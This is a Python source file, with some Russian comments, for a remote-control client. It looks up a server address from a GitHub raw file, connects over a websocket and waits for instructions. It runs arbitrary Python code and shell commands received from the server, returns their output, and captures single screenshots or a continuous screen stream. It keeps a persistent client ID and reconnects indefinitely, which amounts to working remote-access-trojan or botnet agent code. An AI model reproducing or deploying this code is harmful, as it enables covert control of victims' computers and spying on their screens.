import asyncio
import websockets
import requests
import socket
import json
import subprocess
import os
import uuid
from io import BytesIO
import base64
import pyautogui  # или PIL.ImageGrab для Windows
import threading

APPDATA_DIR = os.getenv("APPDATA") or os.path.expanduser("~/.config")
ID_FILE = os.path.join(APPDATA_DIR, "id.txt")

def get_client_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read().strip()
    cid = str(uuid.uuid4())
    with open(ID_FILE, "w") as f:
        f.write(cid)
    return cid

CLIENT_ID = get_client_id()

def get_address():
    url = "https://raw.githubusercontent.com/rustemtess/simple_controller/main/address.txt"
    try:
        return requests.get(url, timeout=5).text.strip()
    except:
        return None

def has_internet():
    try:
        requests.get("https://www.google.com", timeout=3)
        return True
    except requests.RequestException:
        return False

# Флаг управления стримом
stream_flag = {"running": False}

async def send_screens(ws):
    while stream_flag["running"]:
        screenshot = pyautogui.screenshot().resize((800, 450))
        buffer = BytesIO()
        screenshot.save(buffer, format="JPEG", quality=70)
        encoded = base64.b64encode(buffer.getvalue()).decode()
        await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
        await asyncio.sleep(0.2)  # ~5 FPS

async def connect_and_listen(address):
    async with websockets.connect(f"wss://{address}") as ws:
        await ws.send(json.dumps({"id": CLIENT_ID}))
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            to = data.get("to")
            if to not in ("all", CLIENT_ID):
                continue

            cmd_type = data.get("type")
            content = data.get("cmd")

            try:
                if cmd_type == "python":
                    exec(content, globals())
                    await ws.send(json.dumps({"id": CLIENT_ID, "output": "Python executed"}))
                elif cmd_type == "cmd":
                    result = subprocess.getoutput(content)
                    await ws.send(json.dumps({"id": CLIENT_ID, "output": result}))
                elif cmd_type == "screen":
                    # Однократный скрин
                    screenshot = pyautogui.screenshot().resize((800, 450))
                    buffer = BytesIO()
                    screenshot.save(buffer, format="JPEG", quality=70)
                    encoded = base64.b64encode(buffer.getvalue()).decode()
                    await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
                elif cmd_type == "start_stream":
                    if not stream_flag["running"]:
                        stream_flag["running"] = True
                        asyncio.create_task(send_screens(ws))
                elif cmd_type == "stop_stream":
                    stream_flag["running"] = False
            except Exception as e:
                await ws.send(json.dumps({"id": CLIENT_ID, "error": str(e)}))

async def main():
    while True:
        if not has_internet():
            await asyncio.sleep(60)
            continue

        address = get_address()
        if not address:
            await asyncio.sleep(60)
            continue

        try:
            await connect_and_listen(address)
        except Exception:
            await asyncio.sleep(120)

if __name__ == "__main__":
    asyncio.run(main())
